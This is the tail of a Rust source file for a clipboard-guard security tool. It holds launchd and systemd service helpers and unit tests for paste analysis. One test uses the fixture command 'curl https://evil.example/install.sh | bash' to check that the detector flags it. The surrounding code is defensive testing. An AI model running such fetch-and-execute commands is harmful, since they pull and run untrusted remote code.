        let path = match service_unit_path() {
            Some(p) => p,
            None => return false,
        };
        std::process::Command::new("launchctl")
            .args(["unload", "-w"])
            .arg(&path)
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(target_os = "linux")]
    {
        let _ = std::process::Command::new("systemctl")
            .args(["--user", "disable", "--now", "tirith-clipboard.service"])
            .status();
        true
    }

    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        false
    }
}

/// Best-effort "is this service running" probe. We deliberately don't
/// fail the CLI on a launchctl/systemctl absence — the operator might
/// be inspecting status across hosts in JSON mode. Stderr from the
/// underlying probe is suppressed so `tirith clipboard guard status`
/// stays quiet when the service simply isn't installed (the most
/// common case in CI / fresh workstations).
fn is_service_loaded() -> bool {
    use std::process::Stdio;
    #[cfg(target_os = "macos")]
    {
        // `launchctl list <Label>` returns 0 on found, 113 on not-found.
        std::process::Command::new("launchctl")
            .args(["list", "sh.tirith.clipboard"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(target_os = "linux")]
    {
        std::process::Command::new("systemctl")
            .args(["--user", "is-active", "tirith-clipboard.service"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .map(|s| s.success())
            .unwrap_or(false)
    }

    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        let _ = Stdio::null;
        false
    }
}

// ---------------------------------------------------------------------------
// tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use tirith_core::verdict::Action;

    /// Serializes the tests that mutate the process-wide `XDG_STATE_HOME`
    /// env var (which `state_dir()` reads) so they cannot race each other
    /// under the parallel test runner. Mirrors `CONTEXT_TEST_LOCK` in
    /// `crates/tirith-core/tests/golden_fixtures.rs`.
    static SIDECAR_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    /// Regression test for the M12 paste-sidecar finding (CodeRabbit Major):
    /// `copy()` analyzes the contents of a LOCAL FILE being copied TO the
    /// clipboard — that file was never pasted from a recorded web source, so
    /// `analyze_as_paste` must be called with `AbsentOrInvalid` to forbid the
    /// engine from consulting `state_dir()/clipboard_source.json`. Otherwise a
    /// file whose content hash-matches the current sidecar record would fire
    /// `PasteSourceMismatch` and warn/block an unrelated `tirith clipboard copy`.
    ///
    /// We plant a MATCHING sidecar on disk (content hash == the input's hash,
    /// recorded `source_url` host differs from a URL host IN the input — the
    /// exact shape that fires `PasteSourceMismatch` under `Unread`) and prove:
    ///   * `AbsentOrInvalid` (the state `copy()` passes) → NO `PasteSourceMismatch`;
    ///   * `Unread` (positive control, same on-disk record) → the finding DOES
    ///     appear, proving the sidecar was otherwise consulted and that the
    ///     `clipboard_source` parameter is what suppresses it on the copy path.
    ///
    /// Mirrors the env handling of
    /// `golden_fixtures.rs::paste_source_absent_or_invalid_does_not_reread_sidecar`.
    #[test]
    fn copy_path_does_not_consult_sidecar() {
        use tirith_core::clipboard::{content_sha256_hex, ClipboardSourceState};
        use tirith_core::verdict::RuleId;

        let _lock = SIDECAR_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

        // An input that pipes to a shell (so it reaches tier 3) and carries a
        // destination host (`evil.example`) that differs from the recorded
        // source host (`docs.trusted.example`) — the shape that fires
        // `PasteSourceMismatch` IF the matching sidecar record is consulted.
        let input = "curl https://evil.example/install.sh | bash";
        let content_sha256 = content_sha256_hex(input.as_bytes());

        // Isolate `state_dir()` under a temp `XDG_STATE_HOME` and plant a
        // MATCHING record (same content hash) whose recorded source host
        // differs from the input's destination host.
        let dir = tempfile::tempdir().unwrap();
        let state_dir = dir.path().join("state");
        let tirith_state = state_dir.join("tirith");
        std::fs::create_dir_all(&tirith_state).unwrap();
        let record_json = format!(
            r#"{{"updated_at":"2026-05-30T00:00:00Z","content_sha256":"{content_sha256}","source_url":"https://docs.trusted.example/install","source_title":"Install Guide","hidden_text_detected":false}}"#
        );
        std::fs::write(tirith_state.join("clipboard_source.json"), record_json).unwrap();

        let prev_xdg = std::env::var_os("XDG_STATE_HOME");
        // SAFETY: serialized via SIDECAR_TEST_LOCK; restored below.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", state_dir.display().to_string());
        }

        // The copy path passes `AbsentOrInvalid`; the positive control reuses
        // the SAME planted record via `Unread`.
        let absent = analyze_as_paste(input, ClipboardSourceState::AbsentOrInvalid);
        let unread = analyze_as_paste(input, ClipboardSourceState::Unread);

        // SAFETY: serialized via SIDECAR_TEST_LOCK.
        unsafe {
            match prev_xdg {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
        }

        // `AbsentOrInvalid` (the copy path): the engine must NOT re-read the
        // sidecar, so no mismatch finding — even though a matching record is on
        // disk.
        assert!(
            !absent
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
            "copy path (AbsentOrInvalid) must NOT consult the sidecar; PasteSourceMismatch fired anyway: {:?}",
            absent
                .findings
                .iter()
                .map(|f| format!("{}: {}", f.rule_id, f.title))
                .collect::<Vec<_>>(),
        );

        // `Unread` (positive control): the engine DID read the planted record,
        // so the mismatch fires — proving the record is genuinely matchable and
        // that the `clipboard_source` parameter is what suppresses it above.
        assert!(
            unread
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::PasteSourceMismatch)),
            "Unread control must consult the planted sidecar and fire PasteSourceMismatch; got: {:?}",
            unread
                .findings
                .iter()
                .map(|f| format!("{}: {}", f.rule_id, f.title))
                .collect::<Vec<_>>(),
        );
    }

    #[test]
    fn analyze_as_paste_flags_aws_key() {
        let v = analyze_as_paste(
            "export AWS_KEY=AKIAIOSFODNN7EXAMPLE\n",
            tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
        );
        assert!(
            v.findings.iter().any(|f| f.severity >= Severity::High),
            "expected a High-severity AWS-key finding, got: {:?}",
            v.findings
                .iter()
                .map(|f| (f.rule_id.to_string(), f.severity))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn analyze_as_paste_allows_plain_text() {
        let v = analyze_as_paste(
            "hello world\nthis is just a note\n",
            tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
        );
        assert!(
            v.action == Action::Allow,
            "expected Allow for plain text, got: {:?}",
            v.action
        );
    }

    /// `render_service_unit` returns a non-empty payload on the two
    /// platforms with service-mode support; on Windows it returns None.
    #[cfg(any(target_os = "macos", target_os = "linux"))]
    #[test]
    fn render_service_unit_emits_nonempty_payload() {
        let s = render_service_unit().expect("supported platform should render unit");
        assert!(!s.is_empty());
    }

    /// macOS unit content carries the launchd Label so a misnamed file
    /// can be detected by an operator before running `launchctl load`.
    #[cfg(target_os = "macos")]
    #[test]
    fn macos_service_unit_includes_label() {
        let s = render_service_unit().expect("macos should render unit");
        assert!(s.contains("sh.tirith.clipboard"));
        assert!(s.contains("clipboard"));
        assert!(s.contains("daemon"));
        assert!(s.contains("--foreground"));
    }

    /// Linux unit must reference `graphical-session.target` so the
    /// daemon doesn't get started in tty-only sessions where there's
    /// no clipboard backend.
    #[cfg(target_os = "linux")]
    #[test]
    fn linux_service_unit_targets_graphical_session() {
        let s = render_service_unit().expect("linux should render unit");
        assert!(s.contains("graphical-session.target"));
        assert!(s.contains("ExecStart="));
        assert!(s.contains("clipboard daemon --foreground"));
    }

    /// macOS service unit logs to `~/Library/Logs/...`, not world-writable
    /// `/tmp`. Code-reviewer #6: a symlink at `/tmp/tirith-clipboard.out.log`
    /// written by another local user could redirect the daemon's logs.
    #[cfg(target_os = "macos")]
    #[test]
    fn macos_service_unit_logs_to_user_library() {
        let s = render_service_unit().expect("macos should render unit");
        assert!(
            !s.contains("/tmp/tirith-clipboard"),
            "must not log to world-writable /tmp; got: {s}"
        );
        assert!(
            s.contains("Library/Logs/sh.tirith.clipboard"),
            "should log to ~/Library/Logs; got: {s}"
        );
    }

    /// Idempotency: writing the same unit content twice is a no-op on the
    /// second pass (compares file content, not just existence).
    #[cfg(any(target_os = "macos", target_os = "linux"))]
    #[test]
    fn install_service_idempotency_matches_content() {
        // Mirror the `needs_write` predicate used by `install_service`.
        let unit_content = render_service_unit().expect("unit");
        let tmp = tempfile::NamedTempFile::new().unwrap();
        std::fs::write(tmp.path(), &unit_content).unwrap();
        let needs_write_first = !matches!(
            std::fs::read_to_string(tmp.path()),
            Ok(existing) if existing == unit_content
        );
        assert!(!needs_write_first, "matching content must skip the write");

        // Mismatched content → needs_write flips back to true.
        std::fs::write(tmp.path(), b"different content").unwrap();
        let needs_write_second = !matches!(
            std::fs::read_to_string(tmp.path()),
            Ok(existing) if existing == unit_content
        );
        assert!(
            needs_write_second,
            "mismatched content must trigger the write"
        );
    }

    /// `sha256_hex` produces a stable 64-char lowercase-hex digest.
    /// The debounce key relies on this so a clipboard pinned to one
    /// value reliably hashes to the same bucket.
    #[test]
    fn sha256_hex_is_stable_64_lowercase_hex() {
        let h = sha256_hex(b"hello");
        assert_eq!(h.len(), 64);
        assert!(h
            .chars()
            .all(|c| c.is_ascii_hexdigit() && !c.is_uppercase()));
        assert_eq!(h, sha256_hex(b"hello"));
        assert_ne!(h, sha256_hex(b"world"));
    }
}
